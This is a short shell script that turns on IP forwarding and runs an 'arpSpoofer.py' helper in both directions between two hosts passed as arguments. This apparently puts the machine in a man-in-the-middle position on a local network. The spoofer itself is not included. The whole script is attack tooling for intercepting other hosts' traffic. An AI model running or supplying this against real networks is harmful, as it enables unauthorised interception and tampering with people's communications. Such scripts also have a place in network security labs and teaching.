#!/bin/sh

echo 1 > /proc/sys/net/ipv4/ip_forward

./arpSpoofer.py $1 $2 &
./arpSpoofer.py $2 $1 &
